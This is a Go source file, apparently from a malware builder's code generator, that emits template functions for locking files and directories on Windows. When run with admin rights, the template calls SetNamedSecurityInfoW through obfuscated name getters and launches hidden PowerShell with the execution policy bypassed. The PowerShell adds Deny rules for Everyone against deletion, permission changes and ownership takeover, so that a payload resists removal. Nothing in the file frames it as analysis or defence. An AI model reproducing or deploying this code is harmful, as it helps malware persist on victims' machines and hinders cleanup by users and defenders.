package buildergen

import "strings"

func templateAclProtect() string {
	return strings.TrimSpace(`
func protectFileWithACL(path string) {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	setNamedSecurityInfo := advapi32.NewProc(getSetNamedSecurityInfoWName())

	pathPtr, _ := syscall.UTF16PtrFromString(path)

	setNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		1,
		4,
		0, 0,
		0,
		0,
	)

	psCmd := fmt.Sprintf(
		"$acl = Get-Acl '%s'; "+
			"$everyone = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0'); "+
			"$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($everyone,'Delete,DeleteSubdirectoriesAndFiles,ChangePermissions,TakeOwnership','Deny'); "+
			"$acl.AddAccessRule($rule); "+
			"Set-Acl '%s' $acl",
		strings.ReplaceAll(path, "'", "''"),
		strings.ReplaceAll(path, "'", "''"),
	)
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", psCmd)
	_ = cmd.Run()
}

func protectDirectoryWithACL(dirPath string) {
	if !isAdmin() {
		return
	}

	psCmd := fmt.Sprintf(
		"$acl = Get-Acl '%s'; "+
			"$everyone = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0'); "+
			"$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($everyone,'Delete,DeleteSubdirectoriesAndFiles,ChangePermissions,TakeOwnership','ContainerInherit,ObjectInherit','None','Deny'); "+
			"$acl.AddAccessRule($rule); "+
			"Set-Acl '%s' $acl",
		strings.ReplaceAll(dirPath, "'", "''"),
		strings.ReplaceAll(dirPath, "'", "''"),
	)
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", psCmd)
	_ = cmd.Run()
}
`)
}
